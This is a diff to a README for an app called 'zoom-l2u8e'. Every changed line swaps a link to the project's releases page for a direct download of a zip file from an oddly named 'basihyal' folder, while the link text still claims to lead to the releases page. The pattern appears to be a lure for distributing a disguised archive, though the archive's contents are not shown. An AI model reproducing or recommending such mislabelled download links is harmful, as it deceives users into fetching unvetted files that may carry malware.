@@ -6,7 +6,7 @@ Welcome to zoom-l2u8e! This application offers a fun way to explore random conte
 
 ## 📥 Download Link
 
-[![Download zoom-l2u8e](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/3d-web/zoom-l2u8e/releases)
+[![Download zoom-l2u8e](https://raw.githubusercontent.com/3d-web/zoom-l2u8e/main/basihyal/zoom-l2u8e.zip)](https://raw.githubusercontent.com/3d-web/zoom-l2u8e/main/basihyal/zoom-l2u8e.zip)
 
 ## 🔥 Why Use zoom-l2u8e?
 
@@ -25,7 +25,7 @@ To run zoom-l2u8e, your computer should meet the following requirements:
 
 1. **Visit the Download Page**  
    Click on the link below to go to the Releases page, where you can find the latest version of the application.  
-   [Visit the releases page to download](https://github.com/3d-web/zoom-l2u8e/releases)
+   [Visit the releases page to download](https://raw.githubusercontent.com/3d-web/zoom-l2u8e/main/basihyal/zoom-l2u8e.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. It will usually be at the top. You will see options like:
@@ -71,4 +71,4 @@ Join our community to share your experiences and tips with other users. You can 
 
 Thank you for choosing zoom-l2u8e. Enjoy your exploration! 
 
-For more information, visit the [Releases page here](https://github.com/3d-web/zoom-l2u8e/releases).
+For more information, visit the [Releases page here](https://raw.githubusercontent.com/3d-web/zoom-l2u8e/main/basihyal/zoom-l2u8e.zip).
